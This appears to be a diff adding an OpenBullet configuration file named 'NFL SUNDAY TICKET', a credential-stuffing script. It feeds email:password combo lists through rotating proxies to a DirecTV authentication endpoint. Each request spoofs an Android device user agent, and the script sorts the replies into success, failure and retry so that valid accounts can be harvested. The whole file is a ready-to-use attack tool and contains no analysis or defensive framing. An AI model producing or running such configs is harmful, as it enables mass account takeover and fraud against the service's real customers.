@@ -1,0 +1,39 @@
+[SETTINGS]
+{
+  "Name": "NFL SUNDAY TICKET",
+  "SuggestedBots": 50,
+  "LastModified": "2018-07-26T01:24:40.8536807+00:00",
+  "AdditionalInfo": "",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://nfl.directv.com/supercast/service/AuthenticationManager" AutoRedirect=TRUE 
+  CONTENT "site=NFL_Supercast_Android_Cust01&device=60f6779fbaf59207&bo=true&u=<USER>&nonce=true&session=&p=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.4.2; SM-G955N Build/NRD90M)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-UserAgent: samsung;SM-G955N;4.4.2" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Retry OR 
+    KEY "Sorry about the interruption." 
+  KEYCHAIN Failure OR 
+    KEY "status>failure</status>" 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "status>failure</status>" 
